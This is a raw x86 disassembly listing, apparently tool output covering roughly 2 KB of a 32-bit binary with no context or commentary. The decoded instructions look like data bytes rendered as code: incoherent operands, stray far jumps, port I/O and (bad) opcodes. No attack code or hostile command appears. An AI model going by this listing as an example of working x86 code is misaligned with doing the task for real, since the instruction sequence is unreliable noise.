  4136fc:	inc    eax
  4136fd:	sbb    BYTE PTR [edx+0x2a1120],ch
  413703:	dec    eax
  413704:	or     eax,0x39000528
  413709:	add    eax,edx
  41370b:	adc    BYTE PTR [ecx],ah
  41370d:	adc    BYTE PTR [eax-0x70],al
  413710:	test   al,0x4
  413712:	push   edx
  413713:	add    BYTE PTR [edx],ch
  413715:	or     BYTE PTR [eax],al
  413717:	add    DWORD PTR [eax],ecx
  413719:	adc    BYTE PTR [ecx+eax*1+0x58c00950],al
  413720:	add    eax,0x41d18041
  413725:	adc    cl,al
  413727:	add    bh,bh
  413729:	adc    eax,0x421bfc
  41372e:	or     BYTE PTR [ebx],al
  413730:	inc    eax
  413731:	push   cs
  413732:	xor    BYTE PTR [eax-0x55e9ef78],al
  413738:	adc    edx,DWORD PTR [eax-0x7f9ffd00]
  41373e:	and    eax,0x6a881088
  413743:	mov    ds:0x92620410,al
  413748:	pop    edx
  413749:	add    BYTE PTR [ecx],ah
  41374b:	or     DWORD PTR [eax],edx
  41374d:	imul   ecx,DWORD PTR [ecx],0x1720000
  413753:	add    BYTE PTR ds:0x805021f0,cl
  413759:	or     DWORD PTR [eax+0xac96018],esi
  41375f:	adc    ah,al
  413761:	sbb    BYTE PTR [eax],bh
  413763:	dec    eax
  413764:	or     BYTE PTR [ebp+0x4],0xd
  413768:	add    BYTE PTR [edx+0x1],al
  41376b:	sub    BYTE PTR [esp+eax*4],ah
  41376e:	adc    BYTE PTR [eax],0x41
  413771:	adc    dl,BYTE PTR [eax+0x0]
  413774:	adc    BYTE PTR [eax],al
  413776:	add    BYTE PTR [eax],dl
  413778:	or     BYTE PTR [esi],cl
  41377a:	cwde   
  41377b:	push   ebp
  41377c:	add    BYTE PTR [edx],al
  41377e:	adc    BYTE PTR [ecx+0x40001002],al
  413784:	sahf   
  413785:	rol    BYTE PTR [edi+0x2],1
  413788:	xor    BYTE PTR [esi-0x3ffbdfe0],al
  41378e:	add    DWORD PTR [eax+0x0],esp
  413791:	add    BYTE PTR [eax-0x23f73bd0],ch
  413797:	inc    eax
  413798:	ss retf 
  41379a:	add    BYTE PTR [ecx+eiz*1+0x0],al
  41379e:	add    BYTE PTR [eax],0x20
  4137a1:	sub    BYTE PTR [edx],dh
  4137a3:	or     BYTE PTR [edi],al
  4137a5:	je     0x4137a7
  4137a7:	add    al,bh
  4137a9:	es or  al,0x86
  4137ac:	or     BYTE PTR ds:0x7080071,0x4
  4137b3:	or     BYTE PTR [eax],0x47
  4137b6:	mov    BYTE PTR [edx+edx*4],dh
  4137b9:	add    BYTE PTR [eax+0x5e104350],ah
  4137bf:	add    dl,BYTE PTR [eax+0x0]
  4137c2:	adc    BYTE PTR [ecx+0xa3888a],ah
  4137c8:	or     bl,BYTE PTR [ecx]
  4137ca:	add    eax,eax
  4137cc:	and    BYTE PTR [edx],bl
  4137ce:	add    BYTE PTR [eax],al
  4137d0:	or     BYTE PTR [eax],al
  4137d2:	adc    BYTE PTR [eax],al
  4137d4:	nop
  4137d5:	xor    BYTE PTR [eax+eax*4],cl
  4137d8:	pop    eax
  4137d9:	adc    DWORD PTR [eax],esp
  4137db:	inc    edx
  4137dc:	mov    ecx,DWORD PTR [esi+0x49]
  4137df:	mov    BYTE PTR [eax],al
  4137e1:	xchg   BYTE PTR [eax+0x30600330],ch
  4137e7:	or     DWORD PTR [ecx],eax
  4137e9:	or     al,BYTE PTR [ebp+0x10640491]
  4137ef:	pusha  
  4137f0:	or     ah,BYTE PTR [eax]
  4137f2:	add    BYTE PTR [ecx+eax*2],al
  4137f5:	add    DWORD PTR [eax+eax*1],esp
  4137f8:	adc    BYTE PTR [edx-0x2b],al
  4137fb:	adc    DWORD PTR [edx-0x5feff7f4],eax
  413801:	mov    DWORD PTR [esp+esi*2],eax
  413804:	and    DWORD PTR [eax-0x373f7fde],eax
  41380a:	add    eax,0x10202500
  41380f:	add    al,BYTE PTR [ecx]
  413811:	add    BYTE PTR [esp+eax*2],0xe0
  413815:	ss add al,0xa0
  413818:	retf   0x8142
  41381b:	gs mov al,0xe0
  41381e:	xor    eax,DWORD PTR [edx]
  413820:	lock or al,0x10
  413823:	xor    ecx,DWORD PTR [ebx]
  413825:	adc    BYTE PTR [ecx+eax*2+0xa208200],ch
  41382c:	add    eax,0x1b636801
  413831:	pusha  
  413832:	and    esp,DWORD PTR [ecx*1+0x1d004480]
  413839:	add    BYTE PTR [edx-0x6e],al
  41383c:	or     ah,BYTE PTR [eax-0x7efd2c3f]
  413842:	pop    ecx
  413843:	sub    BYTE PTR [edx],dl
  413845:	or     BYTE PTR [eax-0xf],dl
  413848:	sub    BYTE PTR [ecx],ch
  41384a:	add    al,BYTE PTR [eax]
  41384c:	dec    esi
  41384d:	inc    eax
  41384e:	and    al,al
  413850:	and    BYTE PTR [eax],al
  413852:	add    BYTE PTR [eax+eax*1],cl
  413855:	mov    al,ds:0x40222815
  41385a:	push   es
  41385b:	or     BYTE PTR [edx+0x58008831],ch
  413861:	push   ss
  413862:	dec    ecx
  413863:	and    eax,0x901231c8
  413868:	or     al,0xab
  41386a:	or     BYTE PTR [eax],ah
  41386c:	add    al,BYTE PTR [eax+0x24a09680]
  413872:	or     BYTE PTR [edx+0x14],al
  413875:	xor    BYTE PTR [eax+0x60],al
  413878:	cwde   
  413879:	mov    al,ds:0xc9c60001
  41387e:	and    BYTE PTR [edx+0x1a238400],al
  413884:	sub    BYTE PTR [ecx],0xe4
  413887:	sbb    al,BYTE PTR [eax]
  413889:	jns    0x4138b1
  41388b:	inc    ecx
  41388c:	adc    DWORD PTR [eax-0x7dffd7e0],0x4208700
  413896:	adc    DWORD PTR [eax+eax*4],eax
  413899:	adc    BYTE PTR [ebx-0x72bfdf7c],dl
  41389f:	add    al,dl
  4138a1:	and    DWORD PTR [eax],eax
  4138a3:	push   0x40016008
  4138a8:	push   eax
  4138a9:	rol    BYTE PTR [edx],0x90
  4138ac:	adc    BYTE PTR [edx+0x1025013],ch
  4138b2:	push   edx
  4138b3:	adc    BYTE PTR [eax],cl
  4138b5:	mov    al,ds:0x20c184a
  4138ba:	inc    esp
  4138bb:	sbb    DWORD PTR [eax],edi
  4138bd:	fisttp WORD PTR [eax]
  4138bf:	add    al,0x67
  4138c1:	or     BYTE PTR [eax],bl
  4138c3:	dec    eax
  4138c4:	push   ebx
  4138c5:	js     0x413927
  4138c7:	adc    BYTE PTR [eax],al
  4138c9:	sub    BYTE PTR [eax],dl
  4138cb:	or     DWORD PTR [edi],edx
  4138cd:	dec    eax
  4138ce:	add    BYTE PTR [ebp-0x80],dh
  4138d1:	ds inc edx
  4138d3:	adc    BYTE PTR [eax],al
  4138d5:	imul   ecx,DWORD PTR [ecx+0x206b4380],0x59107103
  4138df:	call   0x5101c164
  4138e4:	adc    al,0x27
  4138e6:	pop    es
  4138e7:	or     BYTE PTR [ecx+0x29067a03],dh
  4138ed:	adc    BYTE PTR [eax-0x7ddffebf],bl
  4138f3:	add    BYTE PTR [ebx],cl
  4138f5:	adc    eax,DWORD PTR [eax+0x78]
  4138f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138f9:	add    BYTE PTR [eax],ah
  4138fb:	adc    BYTE PTR [eax+0x0],ch
  4138fe:	test   DWORD PTR [ebx],edi
  413900:	or     DWORD PTR [eax],esp
  413902:	adc    al,0x30
  413904:	push   ecx
  413905:	add    al,0x6
  413907:	test   DWORD PTR [edx+0x40010040],eax
  41390d:	mov    al,ds:0x280400
  413912:	and    DWORD PTR [eax+0x20408129],eax
  413918:	or     al,0x1
  41391a:	mov    WORD PTR [eax+0x22d02489],es
  413920:	adc    al,0x0
  413922:	add    BYTE PTR [esp+eax*2+0x4009a01],cl
  413929:	add    eax,ebx
  41392b:	add    eax,DWORD PTR [ecx]
  41392d:	or     BYTE PTR [eax-0x80],bl
  413930:	pop    eax
  413931:	xchg   esp,eax
  413932:	out    0xa,al
  413934:	push   edx
  413935:	pop    ecx
  413936:	dec    eax
  413937:	fwait
  413938:	and    BYTE PTR [ecx-0x7fdfdbe7],0xa2
  41393f:	push   edx
  413940:	or     BYTE PTR [esi],ah
  413942:	inc    eax
  413943:	dec    edx
  413944:	adc    DWORD PTR [eax+0xad4158],eax
  41394a:	mov    BYTE PTR [eax+0x804908],ah
  413950:	and    al,BYTE PTR [edx+ecx*1]
  413953:	or     DWORD PTR [edx+eax*1+0x2214085],eax
  41395a:	sub    BYTE PTR [eax],ah
  41395c:	add    al,0x81
  41395e:	or     ch,BYTE PTR [edx]
  413960:	add    DWORD PTR [esi-0x4ebf3ffe],edx
  413966:	sbb    BYTE PTR [ecx+0xfb90c0],al
  41396c:	add    BYTE PTR [edx],ch
  41396e:	inc    esp
  41396f:	or     BYTE PTR [eax],0x42
  413972:	mov    WORD PTR [ecx-0x80],es
  413975:	or     DWORD PTR [edx+edx*4],esp
  413978:	pop    ebp
  413979:	or     BYTE PTR [eax+0x6864150],cl
  41397f:	adc    al,0x15
  413981:	inc    eax
  413982:	sub    BYTE PTR [eax+0x6b225202],dl
  413988:	adc    cl,ah
  41398a:	or     al,0x0
  41398c:	add    cl,BYTE PTR [eax]
  41398e:	aam    0x21
  413990:	add    BYTE PTR [eax],bl
  413992:	or     DWORD PTR [eax-0x80],edx
  413995:	sbb    DWORD PTR [esi],edi
  413997:	and    BYTE PTR [eax],0x40
  41399a:	add    DWORD PTR [eax],ecx
  41399c:	les    edx,FWORD PTR [eax]
  41399e:	add    BYTE PTR [edx],bh
  4139a0:	pop    edx
  4139a1:	adc    BYTE PTR [edx+eax*4],al
  4139a4:	add    BYTE PTR [edx],al
  4139a6:	or     BYTE PTR [eax],bl
  4139a8:	lods   al,BYTE PTR ds:[esi]
  4139a9:	mov    eax,ds:0x4045800b
  4139ae:	xor    DWORD PTR [eax+edx*4],0x0
  4139b2:	inc    esp
  4139b3:	cwde   
  4139b4:	pushf  
  4139b5:	add    BYTE PTR [eax],al
  4139b7:	adc    BYTE PTR [edi+0x6],al
  4139ba:	and    al,0x20
  4139bc:	or     ah,BYTE PTR [eax]
  4139be:	into   
  4139bf:	pusha  
  4139c0:	add    esp,DWORD PTR [ecx-0x52]
  4139c3:	sbb    BYTE PTR [ecx],ah
  4139c5:	test   BYTE PTR [eax],dl
  4139c7:	and    al,bl
  4139c9:	add    dl,BYTE PTR [eax]
  4139cb:	add    BYTE PTR [ebx],0x0
  4139ce:	les    esp,FWORD PTR [edx]
  4139d0:	inc    eax
  4139d1:	add    BYTE PTR [ecx],bl
  4139d3:	add    al,0x42
  4139d5:	add    BYTE PTR [esp+eax*8-0x77fafdd0],al
  4139dc:	or     DWORD PTR [esi],0x41026414
  4139e2:	adc    ecx,DWORD PTR [eax-0x3ffbfef0]
  4139e8:	mov    al,0x34
  4139ea:	xor    al,BYTE PTR [eax+eax*1]
  4139ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139ee:	inc    ecx
  4139ef:	dec    ebp
  4139f0:	inc    ebx
  4139f1:	in     al,0x40
  4139f3:	mov    WORD PTR [ecx+0x29c98013],es
  4139f9:	or     BYTE PTR [eax+0x20],al
  4139fc:	push   esp
  4139fd:	or     BYTE PTR [eax],al
  4139ff:	add    DWORD PTR [edx+0x41],0x28483410
  413a06:	shl    BYTE PTR [eax],1
  413a08:	or     ah,cl
  413a0a:	add    BYTE PTR [eax],dh
  413a0c:	add    BYTE PTR [eax],al
  413a0e:	push   0x42
  413a10:	add    al,0xb1
  413a12:	xor    DWORD PTR [ecx],0xba489244
  413a18:	adc    BYTE PTR [edx+eiz*2],cl
  413a1b:	push   esp
  413a1c:	add    al,BYTE PTR [eax-0x76]
  413a1f:	jo     0x413a21
  413a21:	add    al,0x24
  413a23:	adc    BYTE PTR [eax],0x84
  413a26:	adc    BYTE PTR [edx],ch
  413a28:	or     DWORD PTR [edx+edx*1],eax
  413a2b:	test   BYTE PTR [eax-0x80],al
  413a2e:	mov    eax,ds:0x1040090
  413a33:	or     BYTE PTR [eax-0x3c],bl
  413a36:	rol    BYTE PTR [eax+0x0],0x20
  413a3a:	inc    edx
  413a3b:	or     DWORD PTR [eax],eax
  413a3d:	add    DWORD PTR [ecx],eax
  413a3f:	add    BYTE PTR [eax+eax*1-0x4f9f9eee],cl
  413a46:	inc    eax
  413a47:	cwde   
  413a48:	pusha  
  413a49:	pop    es
  413a4a:	add    BYTE PTR [ebx+edx*2+0x43],al
  413a4e:	sbb    al,0x18
  413a50:	add    al,0x0
  413a52:	or     BYTE PTR [ebp+0x42],dl
  413a55:	add    al,0x6
  413a57:	inc    eax
  413a58:	add    eax,0x10180408
  413a5d:	and    DWORD PTR [edx],esp
  413a5f:	or     al,0x11
  413a61:	add    al,0x6d
  413a63:	inc    eax
  413a64:	(bad)  
  413a65:	jmp    0x409:0x8005a020
  413a6c:	add    BYTE PTR [ecx+0x65185000],al
  413a72:	add    edi,DWORD PTR [ecx]
  413a74:	and    BYTE PTR [ebp-0x7b],dl
  413a77:	add    DWORD PTR [ecx],edx
  413a79:	add    BYTE PTR [ecx],ah
  413a7b:	add    BYTE PTR [eax],al
  413a7d:	or     al,0x46
  413a7f:	mov    edx,DWORD PTR [eax]
  413a81:	inc    esp
  413a82:	or     eax,DWORD PTR [ecx]
  413a84:	jo     0x413a2b
  413a86:	or     BYTE PTR [eax],al
  413a88:	add    al,0x24
  413a8a:	inc    eax
  413a8b:	sub    BYTE PTR [eax+eax*1],ah
  413a8e:	and    BYTE PTR [eax],ah
  413a90:	push   0x56
  413a92:	push   ds
  413a93:	rol    BYTE PTR [edx+0xb000009],1
  413a99:	test   BYTE PTR [eax],al
  413a9b:	xor    BYTE PTR [edx+0x57],cl
  413a9e:	das    
  413a9f:	or     al,0x0
  413aa1:	call   0x4a4:0xc2844
  413aa8:	and    BYTE PTR [ecx],dl
  413aaa:	add    al,BYTE PTR [eax+0x2]
  413aad:	and    BYTE PTR [edx+0x40],bl
  413ab0:	add    BYTE PTR [ecx+0x1193064],0xac
  413ab7:	add    BYTE PTR [edx+0x1942ba80],0x92
  413abe:	adc    edx,DWORD PTR [ecx]
  413ac0:	rcl    BYTE PTR [edx+0x6],0xe0
  413ac4:	xchg   ecx,eax
  413ac5:	push   ds
  413ac6:	add    eax,0x55200101
  413acb:	adc    DWORD PTR [eax+0x5],edx
  413ace:	popa   
  413acf:	add    BYTE PTR [eax+eax*4+0x30],0x5
  413ad4:	push   eax
  413ad5:	add    dl,BYTE PTR [ebx]
  413ad7:	push   cs
  413ad8:	sbb    BYTE PTR [edx],ah
  413ada:	add    eax,DWORD PTR [eax]
  413adc:	xor    BYTE PTR [eax],0x84
  413adf:	or     BYTE PTR [ecx+eax*1+0x40401ad],0x26
  413ae7:	and    DWORD PTR [eax-0x5cf77b00],edx
  413aed:	or     cl,BYTE PTR [eax+0x12]
  413af0:	adc    BYTE PTR [ecx+0x200a06],ch
  413af6:	and    BYTE PTR [eax+0xc],ah
  413af9:	mov    al,ds:0x8cf280a
  413afe:	jns    0x413aa1
  413b00:	inc    esp
  413b01:	inc    eax
  413b02:	and    BYTE PTR [edx],ch
  413b04:	and    BYTE PTR [eax+0x80c0180],dl
  413b0a:	add    DWORD PTR [eax],eax
  413b0c:	xor    esp,DWORD PTR [ecx+0x0]
  413b0f:	adc    DWORD PTR [ebx],ecx
  413b11:	add    al,0xa4
  413b13:	sbb    BYTE PTR [eax],al
  413b15:	inc    ecx
  413b16:	add    al,BYTE PTR [ecx]
  413b18:	dec    eax
  413b19:	inc    eax
  413b1a:	dec    eax
  413b1b:	mov    BYTE PTR [edx],al
  413b1d:	add    al,0x8
  413b1f:	add    DWORD PTR [eax+0x4a428018],eax
  413b25:	and    BYTE PTR [ebp+0x64],0x0
  413b29:	inc    eax
  413b2a:	add    BYTE PTR [eax-0x367ed7e0],0x40
  413b31:	or     BYTE PTR [edx-0x2dfbf780],ah
  413b37:	sbb    BYTE PTR [ebx],al
  413b39:	add    BYTE PTR [eax+0x140a23],al
  413b3f:	nop
  413b40:	nop
  413b41:	sub    ah,BYTE PTR [eax+0x71912090]
  413b47:	add    BYTE PTR [esi],al
  413b49:	add    al,BYTE PTR [eax+0xa4ba10]
  413b4f:	lock dec eax
  413b51:	and    edx,DWORD PTR [esi]
  413b53:	add    DWORD PTR [ecx+0x1189162],ecx
  413b59:	xor    BYTE PTR [edx],al
  413b5b:	xor    BYTE PTR [ecx-0x78],al
  413b5e:	adc    al,0x54
  413b60:	push   edx
  413b61:	add    al,0xc
  413b63:	push   es
  413b64:	cwde   
  413b65:	adc    BYTE PTR [eax],al
  413b67:	inc    ecx
  413b68:	inc    edx
  413b69:	and    BYTE PTR [eax],ch
  413b6b:	adc    BYTE PTR [eax+0xe00008],0x0
  413b72:	add    al,0x4e
  413b74:	and    BYTE PTR [ebx+0x0],al
  413b77:	dec    ebx
  413b78:	add    ah,BYTE PTR [ecx+eax*2]
  413b7b:	ror    BYTE PTR [eax+0x40],0x36
  413b7f:	dec    eax
  413b80:	adc    ch,BYTE PTR [eax-0x2ffddfbc]
  413b86:	add    BYTE PTR [ebp-0x57fd7fbf],bh
  413b8c:	add    BYTE PTR [eax+0x80824c0],dh
  413b92:	or     BYTE PTR [ecx],cl
  413b94:	add    cl,BYTE PTR [eax+0x20]
  413b97:	or     BYTE PTR [ecx],0x40
  413b9a:	inc    edx
  413b9b:	or     BYTE PTR [eax+0x40080229],al
  413ba1:	xor    al,0x50
  413ba3:	add    BYTE PTR [eax],dl
  413ba5:	add    BYTE PTR [eax+0x80c183],ah
  413bab:	adc    al,BYTE PTR [eax]
  413bad:	adc    BYTE PTR [eax],al
  413baf:	and    BYTE PTR [ecx],dl
  413bb1:	add    BYTE PTR [eax],ah
  413bb3:	(bad)  
  413bb4:	push   esp
  413bb5:	or     al,0xa8
  413bb7:	add    al,al
  413bb9:	add    dl,BYTE PTR [ecx]
  413bbb:	add    BYTE PTR [eax],dl
  413bbd:	shl    BYTE PTR [eax+0x1008760c],0xa2
  413bc4:	nop
  413bc5:	cwde   
  413bc6:	push   edx
  413bc7:	and    BYTE PTR [ecx-0x80],ah
  413bca:	or     BYTE PTR [ecx],cl
  413bcc:	cmp    BYTE PTR [ecx+0x39208c9],0x94
  413bd3:	and    BYTE PTR [ecx+0x20],ah
  413bd6:	add    DWORD PTR [eax],eax
  413bd8:	add    eax,0xc2098920
  413bdd:	add    BYTE PTR [eax+0x31200200],ch
  413be3:	add    BYTE PTR [esp+ecx*2+0x20009840],0x8
  413beb:	add    BYTE PTR [eax+eiz*4],al
  413bee:	imul   ecx,DWORD PTR [eax],0xa010c10
  413bf4:	dec    ecx
  413bf5:	push   0x21000114
  413bfa:	add    DWORD PTR [edx],eax
  413bfc:	add    al,0x31
  413bfe:	or     al,0x28
  413c00:	ror    BYTE PTR [eax],0xa8
  413c03:	data16 add BYTE PTR [ecx+0x30039c],al
  413c0a:	cmp    BYTE PTR [ecx],dl
  413c0c:	sbb    bl,BYTE PTR [ecx]
  413c0e:	add    BYTE PTR [edx+0x20],al
  413c11:	push   esp
  413c12:	pop    eax
  413c13:	add    BYTE PTR [esp+eax*1],al
  413c16:	or     DWORD PTR [eax-0x7fbbbf68],0x8991a218
  413c20:	lock xor BYTE PTR [edi],0x17
  413c24:	and    BYTE PTR [edx+eiz*2-0x77f7172c],ah
  413c2b:	inc    esp
  413c2c:	or     eax,DWORD PTR [esi]
  413c2e:	mov    WORD PTR [eax],ss
  413c30:	adc    BYTE PTR ds:0x80001032,al
  413c36:	mov    bl,BYTE PTR [eax-0x71b7ff5e]
  413c3c:	sub    BYTE PTR [eax],ah
  413c3e:	add    ah,ah
  413c40:	add    BYTE PTR [eax+ebx*1-0x693b0f98],al
  413c47:	and    BYTE PTR [eax-0x5ff7ef9d],cl
  413c4d:	push   eax
  413c4e:	mov    BYTE PTR [eax+0x0],dl
  413c51:	add    DWORD PTR [eax],eax
  413c53:	sub    BYTE PTR [eax],ah
  413c55:	mov    esp,0xc00902a6
  413c5a:	push   eax
  413c5b:	adc    dh,0x88
  413c5e:	xchg   DWORD PTR [ecx+0x18],edx
  413c61:	add    al,0x85
  413c64:	sbb    ah,cl
  413c66:	inc    eax
  413c67:	inc    ebp
  413c68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c69:	loopne 0x413c71
  413c6b:	add    DWORD PTR [ecx],ecx
  413c6d:	inc    esi
  413c6e:	mov    BYTE PTR [ecx],al
  413c70:	and    al,0x2
  413c72:	or     ah,ch
  413c74:	add    BYTE PTR [eax+ecx*2+0xc00dc27],dl
  413c7b:	add    BYTE PTR [eax],bl
  413c7d:	sbb    BYTE PTR [eax+0x34],dl
  413c80:	add    BYTE PTR [edx],0x4
  413c83:	inc    eax
  413c84:	or     BYTE PTR [eax],al
  413c86:	pusha  
  413c87:	mov    BYTE PTR [eax],bl
  413c89:	add    dl,al
  413c8b:	inc    eax
  413c8c:	inc    eax
  413c8d:	add    dh,cl
  413c8f:	adc    BYTE PTR [eax],al
  413c91:	adc    ah,BYTE PTR [ecx+eax*1+0x0]
  413c95:	add    BYTE PTR ds:0x18005000,al
  413c9b:	cmp    BYTE PTR [eax],dl
  413c9d:	add    al,0x94
  413c9f:	and    esp,DWORD PTR [eax]
  413ca1:	xor    ah,BYTE PTR [edx+0x2a0560e]
  413ca7:	and    BYTE PTR [ecx],al
  413ca9:	nop
  413caa:	inc    esp
  413cab:	add    dl,BYTE PTR [esp+ebx*8-0x39fdde7e]
  413cb2:	add    BYTE PTR [esi-0x20],0x8
  413cb6:	add    DWORD PTR [ebp+0x60],0xc240509a
  413cbd:	inc    ecx
  413cbe:	add    eax,0x404181a8
  413cc3:	adc    BYTE PTR [ecx+0x0],0x94
  413cc7:	pop    es
  413cc8:	adc    al,0xa0
  413cca:	add    DWORD PTR [edx],esp
  413ccc:	inc    ebx
  413ccd:	xor    BYTE PTR cs:[eax],cl
  413cd0:	add    al,0x0
  413cd2:	mov    al,ds:0x2a44c13
  413cd7:	inc    eax
  413cd8:	add    DWORD PTR ds:0x8102102,eax
  413cde:	inc    ebp
  413cdf:	test   BYTE PTR [edx+0x2230812a],bl
  413ce5:	add    al,0x0
  413ce7:	sbb    DWORD PTR [eax-0x3c5bee38],eax
  413ced:	add    BYTE PTR [ecx],al
  413cef:	add    DWORD PTR [eax+eiz*1],eax
  413cf2:	jns    0x413d55
  413cf4:	adc    BYTE PTR [edx],al
  413cf6:	add    BYTE PTR [edx],dl
  413cf8:	and    dl,dh
  413cfa:	add    cl,al
  413cfc:	cmp    BYTE PTR [eax+0x65],cl
  413cff:	inc    eax
  413d00:	dec    edx
  413d01:	xor    BYTE PTR [ecx],al
  413d03:	sar    BYTE PTR [esp+eax*1+0x0],0x44
  413d08:	adc    bl,BYTE PTR [edx+0x740000]
  413d0e:	cmp    ah,BYTE PTR [ebx]
  413d10:	mov    WORD PTR [eax+0x2210008],es
  413d16:	add    al,0xa0
  413d18:	inc    esp
  413d19:	add    al,BYTE PTR [ebx+0x49]
  413d1c:	inc    edx
  413d1d:	add    al,0x10
  413d20:	xor    BYTE PTR [edx],ch
  413d22:	or     DWORD PTR [eax],eax
  413d24:	inc    edx
  413d25:	mov    WORD PTR [eax],ds
  413d27:	scas   al,BYTE PTR es:[edi]
  413d28:	mov    DWORD PTR [eax],eax
  413d2a:	add    BYTE PTR [ecx+0x1000a206],al
  413d30:	or     BYTE PTR [eax],ch
  413d32:	add    DWORD PTR [eax],eax
  413d34:	sbb    BYTE PTR [edx],cl
  413d36:	test   BYTE PTR ds:0x80820420,ah
  413d3c:	sub    BYTE PTR [eax+0x10],cl
  413d3f:	dec    eax
  413d40:	add    ch,BYTE PTR [eax]
  413d42:	rol    DWORD PTR [eax+0x52679241],0x0
  413d49:	or     BYTE PTR [ecx+0x1088900],cl
  413d4f:	or     BYTE PTR [eax],cl
  413d51:	popa   
  413d52:	and    al,0x82
  413d54:	sub    BYTE PTR [eax-0x60],al
  413d57:	add    BYTE PTR [eax+0x4d],0x30
  413d5b:	or     BYTE PTR [eax],0x4
  413d5e:	adc    al,0x8
  413d60:	or     al,0x20
  413d62:	bound  eax,QWORD PTR [ecx]
  413d64:	sbb    BYTE PTR [eax],ch
  413d66:	add    DWORD PTR [eax],eax
  413d68:	inc    edx
  413d69:	adc    bl,BYTE PTR [edx]
  413d6b:	loope  0x413cee
  413d6d:	or     BYTE PTR [ecx+0x49968181],al
  413d73:	sbb    BYTE PTR [esi+0x38],al
  413d76:	xor    cl,BYTE PTR [ecx]
  413d78:	or     BYTE PTR [eax+0x30010720],0x9
  413d7f:	add    DWORD PTR [edx],ebp
  413d81:	add    al,BYTE PTR [edx-0x7ede7780]
  413d87:	cmp    ah,BYTE PTR [ecx]
  413d89:	and    DWORD PTR [eax-0x7e1f6dab],ecx
  413d8f:	cmp    al,0x22
  413d91:	ret    0xaa12
  413d94:	or     BYTE PTR [ebp+0x4e],dh
  413d97:	pusha  
  413d98:	add    BYTE PTR [edx],bl
  413d9a:	mov    al,BYTE PTR [eax+eiz*1]
  413d9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d9e:	jle    0x413db6
  413da0:	dec    eax
  413da1:	add    BYTE PTR [edi],al
  413da3:	add    al,BYTE PTR [eax]
  413da5:	push   edx
  413da6:	add    esp,DWORD PTR [ecx+0x4d]
  413da9:	add    BYTE PTR [ebx+eiz*1],cl
  413dac:	or     BYTE PTR [ecx+0x55861200],al
  413db2:	add    eax,0x46c14535
  413db7:	add    esp,DWORD PTR [eax+0x8082370]
  413dbd:	fadd   st,st(0)
  413dbf:	and    al,0xc
  413dc1:	inc    eax
  413dc2:	and    BYTE PTR [ebx],ah
  413dc4:	cdq    
  413dc5:	mov    al,ds:0x608a40
  413dca:	add    BYTE PTR [eax+0x7609000],0x52
  413dd1:	or     al,0x4
  413dd3:	imul   edx,DWORD PTR [eax],0x9891808a
  413dd9:	cmp    BYTE PTR [edx],dl
  413ddb:	cmp    BYTE PTR [esp+ecx*1+0x44084504],bl
  413de2:	pop    ecx
  413de3:	mov    al,ds:0x2824c
  413de8:	add    BYTE PTR [esi],al
  413dea:	add    al,BYTE PTR [ecx]
  413dec:	xchg   edx,eax
  413ded:	push   ecx
  413dee:	or     BYTE PTR [ebx],ah
  413df0:	push   edx
  413df1:	and    al,0x20
  413df3:	or     DWORD PTR [eax],esi
  413df5:	adc    DWORD PTR [ecx],ecx
  413df7:	repz and BYTE PTR [eax+ecx*1],dl
  413dfb:	inc    ecx
  413dfc:	add    eax,0xd809c010
  413e01:	adc    BYTE PTR [eax],al
  413e03:	add    DWORD PTR [esp+ecx*1],ebx
  413e06:	sub    al,0x58
  413e08:	dec    ebx
  413e09:	inc    esp
  413e0a:	push   0x37ae10c4
  413e0f:	sub    BYTE PTR ds:0x9888a2b4,0x2
  413e16:	rol    BYTE PTR [eax],1
  413e18:	add    BYTE PTR [eax+0xd20ca08],al
  413e1e:	cwde   
  413e1f:	mov    eax,ds:0xa1e0002a
  413e24:	sub    BYTE PTR [ebx+0x24322a80],0x1
  413e2b:	sbb    BYTE PTR fs:[edx+0x46180088],al
  413e32:	test   DWORD PTR [eax+0x15308000],eax
  413e38:	sub    al,BYTE PTR [eax+0x408120a1]
  413e3e:	in     al,0xd
  413e40:	or     BYTE PTR [eax],al
  413e42:	add    DWORD PTR [edx],0x61020800
  413e48:	or     DWORD PTR [edx+eax*8],esp
  413e4b:	adc    al,BYTE PTR fs:[esp+ecx*1+0x19]
  413e50:	popa   
  413e51:	add    dl,BYTE PTR [ecx+eax*1-0x2ffffc00]
  413e58:	push   ecx
  413e59:	cmp    DWORD PTR [eax+0x2490091],eax
  413e5f:	add    bl,bh
  413e61:	add    BYTE PTR [edx],dl
  413e63:	inc    edx
  413e64:	or     esp,DWORD PTR [ecx+0x40]
  413e67:	or     BYTE PTR [edx+0x50],al
  413e6a:	out    0x15,al
  413e6c:	add    dh,BYTE PTR [ecx+0x2]
  413e6f:	inc    eax
  413e70:	add    BYTE PTR [eax+0x14],cl
  413e73:	sub    DWORD PTR [edx+edx*1+0xc38a00],edx
  413e7a:	pop    es
  413e7b:	xor    al,0x39
  413e7d:	sub    BYTE PTR [esi],dl
  413e7f:	adc    eax,DWORD PTR [eax+0x12]
  413e82:	mov    ds:0x211b0a6,al
  413e87:	push   ecx
  413e88:	add    al,BYTE PTR [eax+0x1900490]
  413e8e:	add    BYTE PTR [ecx],al
  413e90:	inc    esp
  413e91:	add    DWORD PTR [edx],esi
  413e93:	pop    ss
  413e94:	inc    ecx
  413e95:	sub    BYTE PTR [eax+0x5],0x0
  413e99:	add    BYTE PTR [ecx+0x2],dl
  413e9c:	adc    BYTE PTR [eax+edx*4],dl
  413e9f:	inc    eax
  413ea0:	or     BYTE PTR [eax],al
  413ea2:	xor    BYTE PTR [eax+ebx*1],al
  413ea5:	adc    BYTE PTR [eax+0x209222a],al
  413eab:	inc    ebp
  413eac:	cwde   
  413ead:	adc    eax,0x84806b00
  413eb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413eb3:	nop
  413eb4:	add    BYTE PTR [ecx],bl
  413eb6:	inc    edx
  413eb7:	add    DWORD PTR [eax+0x10],edi
  413eba:	sbb    eax,0x80c1a194
  413ebf:	inc    edx
  413ec0:	xchg   ebx,eax
  413ec1:	and    BYTE PTR [ecx+edx*2],dl
  413ec4:	adc    BYTE PTR [ecx-0x67ffbfc6],0x50
  413ecb:	xchg   ebx,eax
  413ecc:	mov    cl,BYTE PTR [ecx-0x80]
  413ecf:	add    ah,BYTE PTR [ecx+0x14403218]
  413ed5:	popa   
  413ed6:	add    dh,BYTE PTR [eax]
  413ed8:	add    al,0x50
  413eda:	add    al,0x6
  413edc:	push   eax
